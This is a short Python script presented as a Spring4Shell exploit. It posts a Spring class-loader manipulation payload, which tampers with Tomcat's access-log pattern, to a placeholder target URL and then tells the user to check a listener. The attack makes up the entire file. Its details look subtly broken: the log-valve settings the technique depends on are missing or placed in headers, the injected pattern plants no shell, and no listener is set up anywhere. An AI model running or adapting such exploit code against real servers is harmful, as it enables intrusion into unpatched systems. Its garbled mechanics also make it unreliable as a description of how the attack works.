# spring4shell_exploit.py
import requests

url = "http://target.com"
headers = {
    "suffix": "%>//",
    "c": "Runtime",
    "Content-Type": "application/x-www-form-urlencoded"
}
data = 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc%3AforEach%20items%3D%22%23request.getParameterNames()%22%20var%3D%22param%22%7D%0A%25%7B%23request.getParameter(%23param)%7D%0A%25%7B%23param%7D%0A%25%7B%2FforEach%7D'

requests.post(f"{url}/path", headers=headers, data=data)
print("[+] Exploit sent. Try your listener.")
